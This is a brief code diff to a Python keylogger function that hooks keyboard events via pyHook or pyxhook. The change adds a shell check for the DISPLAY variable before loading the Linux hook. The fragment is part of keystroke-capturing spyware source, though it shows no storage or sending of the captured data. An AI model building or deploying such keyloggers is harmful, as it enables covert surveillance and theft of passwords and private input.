@@ -1,5 +1,5 @@
 import sys
-import os
+import os, subprocess
 
 keysPressed = ">"
 
@@ -19,8 +19,13 @@ def keylogger(size):
         import pythoncom
         from pyHook import HookManager
     else:
-        import pyxhook
-        from pyxhook import HookManager
+        p = subprocess.Popen(["echo $DISPLAY"], shell=True, stdout=subprocess.PIPE)
+        output, err = p.communicate()
+        if len(str(output).strip()) == 0:
+            return "Display not found"
+        else:
+            import pyxhook
+            from pyxhook import HookManager
     global keysPressed
     hm = HookManager()
     hm.KeyDown = onkeyboardevent
